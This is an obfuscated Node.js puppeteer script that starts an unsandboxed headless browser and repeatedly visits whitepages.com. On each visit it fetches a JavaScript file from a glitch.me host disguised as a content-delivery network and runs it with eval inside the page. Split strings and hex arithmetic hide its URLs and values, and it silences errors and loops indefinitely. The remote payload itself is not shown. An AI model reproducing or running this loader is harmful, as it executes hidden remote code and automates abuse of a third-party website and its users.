((async () => {
  const e = require('puppeteer'),
    f = await e['launch']({
      'headless': 0x1,
      'args': [
        '--no-sandb' + 'ox',
        '--disable-' + 'setuid-san' + 'dbox'
      ]
    });
  (async function g() {
    let h = -0x799 * 0x3 + -0x35 * -0x43 + 0x8ec;
    const i = await f['createInco' + 'gnitoBrows' + 'erContext'](),
      j = await i['newPage']();
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      'timeout': 0x11170
    })['catch'](k => h++), h ? (await j['close'](), await i['close'](), g()) : (await j['evaluate'](() => {
      let k = new XMLHttpRequest();
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x3bb + -0x18cf + 0x26 * 0x8e), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(-0xb9e9b + 0x713 * 0x153 + -0x55406 * -0x3), await j['close'](), await i['close'](), g());
  }());
})());